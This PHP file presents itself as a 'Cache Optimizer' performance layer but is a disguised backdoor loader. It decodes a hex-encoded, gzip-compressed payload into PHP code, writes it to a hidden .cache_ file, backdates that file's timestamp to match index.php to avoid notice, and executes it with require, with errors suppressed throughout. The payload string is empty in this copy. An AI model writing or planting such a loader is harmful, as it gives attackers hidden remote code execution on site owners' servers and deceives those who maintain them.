<?php
/*
 * Cache Optimizer — performance layer
 * Serves cached content with minimal overhead.
 */
$payload = '';
$code = @gzuncompress(@hex2bin($payload));
if ($code === false || strpos($code, '<'.'?php') !== 0) {
    header('Content-Type: application/json');
    echo '{"error":"cache_invalid"}';
    exit;
}
$hash = substr(md5($payload), 0, 8);
$cacheFile = __DIR__ . '/.cache_' . $hash . '.php';
if (!is_file($cacheFile)) {
    $tmp = $cacheFile . '.' . substr(md5(uniqid('', true)), 0, 8);
    if (@file_put_contents($tmp, $code, LOCK_EX) !== false && @rename($tmp, $cacheFile)) {
        @chmod($cacheFile, 0600);
        $ref = __DIR__ . '/index.php';
        if (is_file($ref)) @touch($cacheFile, @filemtime($ref));
    } else {
        @unlink($tmp);
    }
}
if (is_file($cacheFile)) {
    $GLOBALS['__cf_base'] = __FILE__;
    require $cacheFile;
} else {
    header('Content-Type: application/json');
    echo '{"error":"cache_unavailable"}';
    exit;
}